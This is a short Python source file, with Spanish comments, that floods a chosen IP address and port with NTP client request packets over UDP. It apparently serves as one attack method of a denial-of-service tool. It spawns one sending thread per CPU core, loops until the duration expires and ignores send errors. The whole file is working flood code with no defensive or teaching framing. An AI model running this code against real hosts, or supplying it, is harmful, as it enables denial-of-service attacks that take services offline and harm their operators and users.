import socket
import threading
import time
import os

def build_ntp_request():
    # Header: LI = 0, VN = 3, Mode = 3 (client)
    return b'\x1b' + 47 * b'\x00'

def worker(ip, port, duration, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ntp_payload = build_ntp_request()
    end_time = time.time() + duration

    try:
        while not stop_event.is_set() and time.time() < end_time:
            try:
                sock.sendto(ntp_payload, (ip, port))
            except Exception as e:
                pass  # Error de envío, ignora y sigue
    finally:
        sock.close()

def run(ip, port, duration, stop_event, threads=None):
    if threads is None:
        threads = os.cpu_count() or 4  # Usa todos los núcleos disponibles

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(ip, port, duration, stop_event))
        t.daemon = True
        t.start()
        thread_list.append(t)

    # Espera a que termine el tiempo o el evento
    end_time = time.time() + duration
    while time.time() < end_time and not stop_event.is_set():
        time.sleep(0.1)

    # Espera a que todos los hilos terminen
    for t in thread_list:
        t.join(timeout=0.1)
